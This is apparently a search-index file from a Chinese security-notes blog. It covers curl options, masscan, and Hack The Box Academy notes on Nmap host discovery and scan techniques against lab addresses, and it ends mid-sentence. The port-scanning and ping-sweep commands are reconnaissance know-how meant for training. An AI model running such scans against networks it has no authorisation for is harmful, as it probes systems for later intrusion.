{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"This is blog","text":"<p>\u7a7a\u7684\u4e3b\u9875 hacktricks hackthebox htb-academy</p> <p>Quick setup \u2014 if you\u2019ve done this kind of thing before or https://github.com/ovuln/ovuln.github.io.git Get started by creating a new file or uploading an existing file. We recommend every repository include a README, LICENSE, and .gitignore.</p> <p>\u2026or create a new repository on the command line echo \"# ovuln.github.io\" &gt;&gt; README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/ovuln/ovuln.github.io.git git push -u origin main \u2026or push an existing repository from the command line git remote add origin https://github.com/ovuln/ovuln.github.io.git git branch -M main git push -u origin main</p>"},{"location":"CheetSheet/Curl%20Cheet%20Sheet/","title":"Curl Cheet Sheet","text":"<p>\u547d\u4ee4\u884c\u6d4f\u89c8\u5668</p> <p>Curl \u662f\u4e00\u79cd\u7528\u4e8e\u4ece\u670d\u52a1\u5668\u4f20\u8f93\u6570\u636e\u6216\u5411\u670d\u52a1\u5668\u4f20\u8f93\u6570\u636e\u7684\u5de5\u5177\u3002</p> <p>\u652f\u6301\u534f\u8bae\uff1a</p> <p>DICT, FILE, FTP, FTPS, GOPHER, GOPHERS,  HTTP,  HTTPS, IMAP,  IMAPS,  LDAP,  LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP</p> <p>\u8be5\u547d\u4ee4\u65e8\u5728\u6ca1\u6709\u7528\u6237\u4ea4\u4e92\u7684\u60c5\u51b5\u4e0b\u5de5\u4f5c\u3002</p> <p>\u63d0\u4f9b\u4e86\u975e\u5e38\u591a\u6709\u7528\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u4ee3\u7406\u652f\u6301\uff0c\u7528\u6237\u8ba4\u8bc1\uff0cHTTP POST\uff0cFTP Upload\uff0c\u65ad\u70b9\u7eed\u4f20\u7b49\u3002</p> \u9009\u9879 \u63cf\u8ff0 -d, --data  HTTP POST data -H, --header header/@file HTTP Header data -v \u66f4\u8be6\u7ec6\u7684\u4fe1\u606f -A, --user-agent  \u53d1\u9001 User-Agent \u4fe1\u606f\u5230\u670d\u52a1\u5668 -b, --cookie  \u6307\u5b9a\u5b57\u7b26\u4e32\u6216\u6587\u4ef6\u6dfb\u52a0 cookie -I, --head \u53ea\u67e5\u770bHTTP\u54cd\u5e94\u5934\u4fe1\u606f -T, --upload-file  \u4e0a\u4f20\u672c\u5730\u6587\u4ef6"},{"location":"CheetSheet/Masscan/","title":"Masscan","text":"<p>\u4e92\u8054\u7f51\u89c4\u6a21\u7684\u7aef\u53e3\u626b\u63cf\u5668\u3002\u5b83\u53ef\u4ee5\u5728 5 \u5206\u949f\u5185\u626b\u63cf\u6574\u4e2a\u4e92\u8054\u7f51\uff0c\u4ece\u5355\u53f0\u673a\u5668\u6bcf\u79d2\u4f20\u8f93 1000 \u4e07\u4e2a\u6570\u636e\u5305\u3002 \u652f\u6301\u5e7f\u6cdb\u626b\u63cf\u591a\u53f0\u673a\u5668\u7684\u529f\u80fd\uff0c\u4f46\u4e0d\u652f\u6301\u5355\u53f0\u673a\u5668\u7684\u6df1\u5ea6\u626b\u63cf\u3002</p> <p>Usage</p> <pre><code>$ masscan -p80,7000-9000 10.0.0.0/8\n\n</code></pre> <p>\u914d\u5408nmap\u4f7f\u7528</p> <pre><code>$ masscan -p1-65535 10.10.10.100 --rate=1000 -e tun0 &gt; ports\n$ ports=$(cat ports | awk -F \" \" '{print $4}' | awk -F \"/\" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')\n$ nmap -sC -sV -v -Pn -p$ports 10.10.10.100\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/","title":"Nmap \u7f51\u7edc\u679a\u4e3e - HTB \u7b14\u8bb0","text":""},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_1","title":"\u4ecb\u7ecd","text":""},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_2","title":"\u679a\u4e3e","text":"<p>\u679a\u4e3e\u662f\u6700\u5173\u952e\u7684\u90e8\u5206\u3002\u56f0\u96be\u7684\u4e0d\u662f\u83b7\u5f97\u76ee\u6807\u8ba1\u7b97\u673a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u800c\u662f\u8bc6\u522b\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u653b\u51fb\u76ee\u6807\u7684\u6240\u6709\u65b9\u5f0f\u3002</p> <p>\u4e0d\u80fd\u4ec5\u4ec5\u9760\u5de5\u5177\uff0c\u5fc5\u987b\u4e86\u89e3\u8fd9\u4e9b\u670d\u52a1\u5982\u4f55\u5de5\u4f5c\u4ee5\u53ca\u5b83\u4eec\u4f7f\u7528\u4ec0\u4e48\u8bed\u6cd5\u6765\u4e0e\u4e0d\u540c\u670d\u52a1\u8fdb\u884c\u6709\u6548\u901a\u8baf\u548c\u4ea4\u4e92\u3002</p> <p>\u6b64\u9636\u6bb5\u65e8\u5728\u63d0\u9ad8\u6211\u4eec\u5bf9\u6280\u672f\u3001\u534f\u8bae\u4ee5\u53ca\u5176\u5de5\u4f5c\u65b9\u5f0f\u7684\u77e5\u8bc6\u548c\u7406\u89e3\uff0c\u5e76\u5b66\u4e60\u5904\u7406\u65b0\u4fe1\u606f\u5e76\u9002\u5e94\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u7684\u77e5\u8bc6\u3002\u679a\u4e3e\u6b63\u5728\u6536\u96c6\u5c3d\u53ef\u80fd\u591a\u7684\u4fe1\u606f\u3002\u6211\u4eec\u638c\u63e1\u7684\u4fe1\u606f\u8d8a\u591a\uff0c\u5c31\u8d8a\u5bb9\u6613\u627e\u5230\u7a81\u7834\u53e3\u3002</p> <p>\u4e00\u65e6\u6211\u4eec\u77e5\u9053\u5982\u4f55\u8bbf\u95ee\u76ee\u6807\u7cfb\u7edf\uff0c\u5c31\u4e0d\u96be\u4e86\u3002\u6211\u4eec\u83b7\u5f97\u8bbf\u95ee\u6743\u9650\u7684\u5927\u591a\u6570\u65b9\u5f0f\u53ef\u4ee5\u7f29\u5c0f\u5230\u4ee5\u4e0b\u4e24\u70b9\uff1a</p> <ul> <li> <p>\u5141\u8bb8\u6211\u4eec\u4e0e\u76ee\u6807\u4ea4\u4e92 and/or \u63d0\u4f9b\u989d\u5916\u4fe1\u606f\u7684\u529f\u80fd and/or \u8d44\u6e90\u3002</p> </li> <li> <p>\u4e3a\u6211\u4eec\u63d0\u4f9b\u8bbf\u95ee\u76ee\u6807\u7684\u66f4\u91cd\u8981\u7684\u4fe1\u606f\u3002</p> </li> </ul> <p>\u5728\u626b\u63cf\u548c\u68c0\u67e5\u65f6\uff0c\u6211\u4eec\u6b63\u662f\u5728\u5bfb\u627e\u8fd9\u4e24\u79cd\u53ef\u80fd\u6027\u3002\u6211\u4eec\u83b7\u5f97\u7684\u5927\u90e8\u5206\u4fe1\u606f\u6765\u81ea\u9519\u8bef\u914d\u7f6e\u6216\u5ffd\u89c6\u76f8\u5e94\u670d\u52a1\u7684\u5b89\u5168\u6027\u3002\u9519\u8bef\u914d\u7f6e\u8981\u4e48\u662f\u65e0\u77e5\u7684\u7ed3\u679c\uff0c\u8981\u4e48\u662f\u9519\u8bef\u7684\u5b89\u5168\u5fc3\u6001\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7ba1\u7406\u5458\u4ec5\u4f9d\u9760\u9632\u706b\u5899\u3001\u7ec4\u7b56\u7565\u5bf9\u8c61 (GPO) \u548c\u6301\u7eed\u66f4\u65b0\uff0c\u901a\u5e38\u4e0d\u8db3\u4ee5\u4fdd\u62a4\u7f51\u7edc\u5b89\u5168\u3002</p> <p>\u5982\u4f55\u4e0e\u670d\u52a1\u4ea4\u4e92\u4ee5\u53ca\u76f8\u5173\u7684\u4e1c\u897f\u662f\u5173\u952e\u7684\uff0c\u6295\u5165\u51e0\u4e2a\u5c0f\u65f6\u6765\u66f4\u591a\u5730\u4e86\u89e3\u8be5\u670d\u52a1\u3001\u5b83\u7684\u5de5\u4f5c\u539f\u7406\u4ee5\u53ca\u5b83\u7684\u7528\u9014\uff0c\u4ed6\u4eec\u5c06\u53ef\u4ee5\u8282\u7701\u51e0\u4e2a\u5c0f\u65f6\u751a\u81f3\u51e0\u5929\u7684\u65f6\u95f4\u6765\u5b9e\u73b0\u4ed6\u4eec\u7684\u76ee\u6807\u5e76\u8bbf\u95ee\u8be5\u7cfb\u7edf\u3002</p> <p><code>Manual enumeration</code>\u662f\u4e00\u4e2a<code>critical</code>\u7ec4\u4ef6\u3002\u8bb8\u591a\u626b\u63cf\u5de5\u5177\u7b80\u5316\u5e76\u52a0\u901f\u4e86\u8fd9\u4e2a\u8fc7\u7a0b\u3002\u4f46\u662f\uff0c\u8fd9\u4e9b\u4e0d\u80fd\u603b\u662f\u7ed5\u8fc7\u670d\u52a1\u7684\u5b89\u5168\u63aa\u65bd\u3002\u8bf4\u660e\u8fd9\u4e00\u70b9\u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u4f7f\u7528\u4ee5\u4e0b\u793a\u4f8b\uff1a</p> <p>\u5927\u591a\u6570\u626b\u63cf\u5de5\u5177\u90fd\u6709\u4e00\u4e2a\u8d85\u65f6\u8bbe\u7f6e\uff0c\u76f4\u5230\u5b83\u4eec\u6536\u5230\u6765\u81ea\u670d\u52a1\u7684\u54cd\u5e94\u3002\u5982\u679c\u6b64\u5de5\u5177\u5728\u7279\u5b9a\u65f6\u95f4\u5185\u6ca1\u6709\u54cd\u5e94\uff0c\u6b64\u670d\u52a1/\u7aef\u53e3\u5c06\u88ab\u6807\u8bb0\u4e3a\u5173\u95ed\u3001\u8fc7\u6ee4\u6216\u672a\u77e5\u3002\u5728\u540e\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u5b83\u3002\u7136\u800c\uff0c\u5982\u679c\u4e00\u4e2a\u7aef\u53e3\u88ab\u6807\u8bb0\u4e3a\u5173\u95ed\u5e76\u4e14 Nmap \u6ca1\u6709\u5411\u6211\u4eec\u663e\u793a\u5b83\uff0c\u6211\u4eec\u5c31\u4f1a\u5904\u4e8e\u7cdf\u7cd5\u7684\u5883\u5730\u3002\u8be5\u670d\u52a1/\u7aef\u53e3\u53ef\u80fd\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u627e\u5230\u8bbf\u95ee\u7cfb\u7edf\u7684\u65b9\u6cd5\u7684\u673a\u4f1a\u3002\u56e0\u6b64\uff0c\u5728\u6211\u4eec\u627e\u5230\u5b83\u4e4b\u524d\uff0c\u8fd9\u4e2a\u7ed3\u679c\u53ef\u80fd\u4f1a\u82b1\u8d39\u5f88\u591a\u4e0d\u5fc5\u8981\u7684\u65f6\u95f4\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap","title":"Nmap \u7b80\u4ecb","text":"<p>Network Mapper ( <code>Nmap</code>) \u662f\u4e00\u4e2a\u7528 C\u3001C++\u3001Python \u548c Lua \u7f16\u5199\u7684\u5f00\u6e90\u7f51\u7edc\u5206\u6790\u548c\u5b89\u5168\u5ba1\u8ba1\u5de5\u5177\u3002\u5b83\u65e8\u5728\u626b\u63cf\u7f51\u7edc\u5e76\u4f7f\u7528\u539f\u59cb\u6570\u636e\u5305\u3001\u670d\u52a1\u548c\u5e94\u7528\u7a0b\u5e8f\uff08\u5305\u62ec\u540d\u79f0\u548c\u7248\u672c\uff09\u8bc6\u522b\u7f51\u7edc\u4e0a\u53ef\u7528\u7684\u4e3b\u673a\u3002\u5b83\u8fd8\u53ef\u4ee5\u8bc6\u522b\u8fd9\u4e9b\u4e3b\u673a\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u7248\u672c\u3002\u9664\u4e86\u5176\u4ed6\u529f\u80fd\u5916\uff0cNmap \u8fd8\u63d0\u4f9b\u626b\u63cf\u529f\u80fd\uff0c\u53ef\u4ee5\u786e\u5b9a\u662f\u5426\u6839\u636e\u9700\u8981\u914d\u7f6e\u4e86\u6570\u636e\u5305\u8fc7\u6ee4\u5668\u3001\u9632\u706b\u5899\u6216\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf (IDS)\u3002</p> <p>\u5efa\u8bae\u5b58\u50a8\u6bcf\u4e00\u6b21\u626b\u63cf\u3002\u8fd9\u53ef\u4ee5\u5728\u4ee5\u540e\u7528\u4e8e\u6bd4\u8f83\u3001\u6587\u6863\u548c\u62a5\u544a\u3002\u6bd5\u7adf\uff0c\u4e0d\u540c\u7684\u5de5\u5177\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u533a\u5206\u54ea\u4e2a\u5de5\u5177\u4ea7\u751f\u54ea\u4e2a\u7ed3\u679c\u53ef\u80fd\u662f\u6709\u76ca\u7684\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_3","title":"\u7528\u4f8b","text":"<p>\u8be5\u5de5\u5177\u662f\u7f51\u7edc\u7ba1\u7406\u5458\u548c IT \u5b89\u5168\u4e13\u5bb6\u6700\u5e38\u7528\u7684\u5de5\u5177\u4e4b\u4e00\u3002\u5b83\u7528\u4e8e\uff1a</p> <ul> <li>\u5ba1\u8ba1\u7f51\u7edc\u7684\u5b89\u5168\u65b9\u9762</li> <li>\u6a21\u62df\u6e17\u900f\u6d4b\u8bd5</li> <li>\u68c0\u67e5\u9632\u706b\u5899\u548c IDS \u8bbe\u7f6e\u548c\u914d\u7f6e</li> <li>\u7f51\u7edc\u8fde\u63a5\u7684\u53ef\u80fd\u7c7b\u578b</li> <li>\u7f51\u7edc\u6620\u5c04</li> <li>\u54cd\u5e94\u5206\u6790</li> <li>\u8bc6\u522b\u5f00\u653e\u7aef\u53e3</li> <li>\u8106\u5f31\u6027\u8bc4\u4f30\u3002</li> </ul>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap_1","title":"Nmap\u67b6\u6784","text":"<p>Nmap \u63d0\u4f9b\u4e86\u8bb8\u591a\u4e0d\u540c\u7c7b\u578b\u7684\u626b\u63cf\uff0c\u53ef\u7528\u4e8e\u83b7\u53d6\u6709\u5173\u6211\u4eec\u76ee\u6807\u7684\u5404\u79cd\u7ed3\u679c\u3002\u57fa\u672c\u4e0a\uff0cNmap \u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\u626b\u63cf\u6280\u672f\uff1a</p> <ul> <li>\u4e3b\u673a\u53d1\u73b0</li> <li>\u7aef\u53e3\u626b\u63cf</li> <li>\u670d\u52a1\u679a\u4e3e\u548c\u68c0\u6d4b</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b</li> <li>\u4e0e\u76ee\u6807\u670d\u52a1\u7684\u811a\u672c\u5316\u4ea4\u4e92\uff08Nmap \u811a\u672c\u5f15\u64ce\uff09</li> </ul>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_4","title":"\u8bed\u6cd5","text":"<p>Nmap \u7684\u8bed\u6cd5\u76f8\u5f53\u7b80\u5355\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>darkinga@htb[/htb]$ nmap &lt;scan types&gt; &lt;options&gt; &lt;target&gt;\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_5","title":"\u626b\u63cf\u6280\u672f","text":"<p>Nmap \u63d0\u4f9b\u4e86\u8bb8\u591a\u4e0d\u540c\u7684\u626b\u63cf\u6280\u672f\uff0c\u5efa\u7acb\u4e0d\u540c\u7c7b\u578b\u7684\u8fde\u63a5\u5e76\u4f7f\u7528\u4e0d\u540c\u7ed3\u6784\u7684\u6570\u636e\u5305\u6765\u53d1\u9001\u3002\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Nmap \u63d0\u4f9b\u7684\u6240\u6709\u626b\u63cf\u6280\u672f\uff1a</p> <pre><code>darkinga@htb[/htb]$ nmap --help\n\n&lt;SNIP&gt;\nSCAN TECHNIQUES:\n  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans\n  -sU: UDP Scan\n  -sN/sF/sX: TCP Null, FIN, and Xmas scans\n  --scanflags &lt;flags&gt;: Customize TCP scan flags\n  -sI &lt;zombie host[:probeport]&gt;: Idle scan\n  -sY/sZ: SCTP INIT/COOKIE-ECHO scans\n  -sO: IP protocol scan\n  -b &lt;FTP relay host&gt;: FTP bounce scan\n&lt;SNIP&gt;\n</code></pre> <p>\u4f8b\u5982\uff0c\u9664\u975e\u6211\u4eec\u53e6\u6709\u5b9a\u4e49\uff0c\u5426\u5219TCP-SYN \u626b\u63cf (<code>-sS</code> ) \u662f\u9ed8\u8ba4\u8bbe\u7f6e\u4e4b\u4e00\uff0c\u4e5f\u662f\u6700\u6d41\u884c\u7684\u626b\u63cf\u65b9\u6cd5\u4e4b\u4e00\u3002\u8fd9\u79cd\u626b\u63cf\u65b9\u6cd5\u53ef\u4ee5\u6bcf\u79d2\u626b\u63cf\u6570\u5343\u4e2a\u7aef\u53e3\u3002TCP-SYN \u626b\u63cf\u53d1\u9001\u4e00\u4e2a\u5e26\u6709 SYN \u6807\u5fd7\u7684\u6570\u636e\u5305\uff0c\u56e0\u6b64\u6c38\u8fdc\u4e0d\u4f1a\u5b8c\u6210\u4e09\u6b21\u63e1\u624b\uff0c\u4ece\u800c\u5bfc\u81f4\u65e0\u6cd5\u4e0e\u626b\u63cf\u7aef\u53e3\u5efa\u7acb\u5b8c\u6574\u7684 TCP \u8fde\u63a5\u3002</p> <ul> <li>\u5982\u679c\u6211\u4eec\u7684\u76ee\u6807\u5c06<code>SYN-ACK</code>\u6807\u8bb0\u7684\u6570\u636e\u5305\u53d1\u9001\u56de\u626b\u63cf\u7684\u7aef\u53e3\uff0cNmap \u4f1a\u68c0\u6d4b\u5230\u8be5\u7aef\u53e3\u662f<code>open</code>.</li> <li>\u5982\u679c\u6570\u636e\u5305\u6536\u5230<code>RST</code>\u6807\u5fd7\uff0c\u5219\u8868\u660e\u8be5\u7aef\u53e3\u662f<code>closed</code>\u3002</li> <li>\u5982\u679c Nmap \u6ca1\u6709\u6536\u5230\u8fd4\u56de\u7684\u6570\u636e\u5305\uff0c\u5b83\u5c06\u663e\u793a\u4e3a<code>filtered</code>. \u6839\u636e\u9632\u706b\u5899\u914d\u7f6e\uff0c\u67d0\u4e9b\u6570\u636e\u5305\u53ef\u80fd\u4f1a\u88ab\u9632\u706b\u5899\u4e22\u5f03\u6216\u5ffd\u7565\u3002</li> </ul> <p>\u8ba9\u6211\u4eec\u4e3e\u4e00\u4e2a\u8fd9\u6837\u7684\u626b\u63cf\u7684\u4f8b\u5b50\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap -sS localhost\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 22:50 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000010s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5432/tcp open  postgresql\n5901/tcp open  vnc-1\n\nNmap done: 1 IP address (1 host up) scanned in 0.18 seconds\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6253\u5f00\u4e86\u56db\u4e2a\u4e0d\u540c\u7684 TCP \u7aef\u53e3\u3002\u5728\u7b2c\u4e00\u5217\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u7aef\u53e3\u53f7\u3002\u7136\u540e\uff0c\u5728\u7b2c\u4e8c\u5217\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u670d\u52a1\u7684\u72b6\u6001\u4ee5\u53ca\u5b83\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u670d\u52a1\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_6","title":"\u4e3b\u673a\u679a\u4e3e","text":""},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_7","title":"\u4e3b\u673a\u53d1\u73b0","text":"<p>\u6700\u6709\u6548\u5feb\u901f\u7684\u65b9\u6cd5\u662f\u4f7f\u7528 <code>ICMP</code> \u56de\u663e\u8bf7\u6c42\u65b9\u6cd5</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_8","title":"\u626b\u63cf\u7f51\u7edc\u8303\u56f4","text":"<pre><code>$ sudo nmap 10.10.10.10/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n</code></pre> <p><code>10.10.10.10/24</code>    \u76ee\u6807\u7f51\u7edc\u8303\u56f4</p> <p><code>-sn</code>   \u7981\u7528\u7aef\u53e3\u626b\u63cf</p> <p><code>-oA tnet</code>  \u4ee5\u540d\u79f0\u201ctnet\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002</p> <p>\u4e3b\u673a\u9632\u706b\u5899\u672a\u7981\u7528 <code>ICMP</code> \u65f6\u624d\u751f\u6548</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip","title":"\u626b\u63cf IP \u5217\u8868","text":"<p>\u5728\u5185\u90e8\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\uff0c\u5411\u6211\u4eec\u63d0\u4f9b\u5305\u542b\u6211\u4eec\u9700\u8981\u6d4b\u8bd5\u7684\u4e3b\u673a\u7684 IP \u5217\u8868\u7684\u60c5\u51b5\u5e76\u4e0d\u5c11\u89c1\u3002 Nmap \u8fd8\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u5b9e\u7528\u5217\u8868\u5e76\u4ece\u5217\u8868\u4e2d\u8bfb\u53d6\u4e3b\u673a\u7684\u9009\u9879\uff0c\u800c\u4e0d\u662f\u624b\u52a8\u5b9a\u4e49\u6216\u8f93\u5165\u5b83\u4eec\u3002</p> <pre><code>$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA tnet</code> \u4ee5\u540d\u79f0\u201ctnet\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <code>-iL</code> \u9488\u5bf9\u63d0\u4f9b\u7684\u201chosts.lst\u201d\u5217\u8868\u4e2d\u7684\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip_1","title":"\u626b\u63cf\u591a\u4e2aIP","text":"<p>\u4e5f\u53ef\u80fd\u6211\u4eec\u53ea\u9700\u8981\u626b\u63cf\u7f51\u7edc\u7684\u4e00\u5c0f\u90e8\u5206\u3002\u6211\u4eec\u4e0a\u6b21\u4f7f\u7528\u7684\u65b9\u6cd5\u7684\u66ff\u4ee3\u65b9\u6cd5\u662f\u6307\u5b9a\u591a\u4e2a IP \u5730\u5740\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n</code></pre> <p>\u5982\u679c\u8fd9\u4e9b IP \u5730\u5740\u5f7c\u6b64\u76f8\u90bb\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u5404\u81ea\u7684\u516b\u4f4d\u5b57\u8282\u4e2d\u5b9a\u4e49\u8303\u56f4\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip_2","title":"\u626b\u63cf\u5355\u4e2aIP","text":"<p>\u5728\u6211\u4eec\u626b\u63cf\u5355\u4e2a\u4e3b\u673a\u7684\u5f00\u653e\u7aef\u53e3\u53ca\u5176\u670d\u52a1\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u5fc5\u987b\u786e\u5b9a\u5b83\u662f\u5426\u5b58\u6d3b\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0e\u4ee5\u524d\u76f8\u540c\u7684\u65b9\u6cd5\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST\nNmap scan report for 10.129.2.18\nHost is up (0.087s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.18</code> \u9488\u5bf9\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA host</code> \u4ee5\u540d\u79f0\u201c\u4e3b\u673a\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <p>\u5982\u679c\u6211\u4eec\u7981\u7528\u7aef\u53e3\u626b\u63cf ( )\uff0cNmap \u4f1a\u81ea\u52a8\u4f7f\u7528( ) <code>-sn</code>ping \u626b\u63cf\u3002\u4e00\u65e6\u53d1\u9001\u4e86\u8fd9\u6837\u7684\u8bf7\u6c42\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u671f\u5f85ping \u4e3b\u673a\u662f\u5426\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u3002\u66f4\u6709\u8da3\u7684\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u7684\u626b\u63cf\u5e76\u6ca1\u6709\u8fd9\u6837\u505a\uff0c\u56e0\u4e3a\u5728 Nmap \u53ef\u4ee5\u53d1\u9001 ICMP \u56de\u663e\u8bf7\u6c42\u4e4b\u524d\uff0c\u5b83\u4f1a\u53d1\u9001\u4e00\u4e2a. \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u201c \u201d\u9009\u9879\u786e\u8ba4\u8fd9\u4e00\u70b9\u3002\u4e3a\u786e\u4fdd\u53d1\u9001 ICMP \u56de\u663e\u8bf7\u6c42\uff0c\u6211\u4eec\u8fd8\u4e3a\u6b64\u5b9a\u4e49\u4e86\u9009\u9879 ( )\u3002<code>ICMP Echo Requests``-PE``ICMP reply``ARP ping``ARP reply``--packet-trace``-PE</code></p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up (0.023s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.18</code> \u9488\u5bf9\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA host</code> \u4ee5\u540d\u79f0\u201c\u4e3b\u673a\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <code>-PE</code> \u901a\u8fc7\u4f7f\u7528\u201cICMP Echo 